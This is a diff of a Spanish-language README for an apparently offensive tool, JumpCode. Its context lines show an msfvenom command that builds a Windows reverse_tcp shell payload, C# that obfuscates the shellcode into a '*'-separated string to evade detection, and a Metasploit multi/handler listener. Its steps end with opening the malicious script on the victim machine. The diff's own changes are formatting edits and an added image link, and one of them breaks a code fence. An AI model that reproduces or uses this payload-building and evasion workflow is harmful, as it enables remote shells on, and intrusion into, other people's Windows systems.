@@ -15,7 +15,7 @@ msfvenom --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.X LPORT
 ```csharp
 // Conversión a formato ofuscado (ejemplo real)
 string payload = "*fc*e8*82...*d5";  // 1. Eliminar "0x", 2. Reemplazar con "*", 3. Quitar comas
-```
+``
 ▸ **Técnicas avanzadas**:  
 • **Split inteligente**:  
 ```csharp
@@ -48,7 +48,9 @@ msfconsole /multi/handler
 msfconsole(/multi/handler)> use/windows/shell/reverse_tcp
 ````
 #### **6. Ejecutar el payload**
-Configurar el lhost y lport y finalmente lanzar el exploit
+*Configurar el lhost y lport y finalmente lanzar el exploit*
+
+![image](https://github.com/90l3m0np13/JumpCode/blob/main/JumpCode.png)
 
 #### **7. Finalmente abrir el scrip malicioso en la máquina atacada**
 
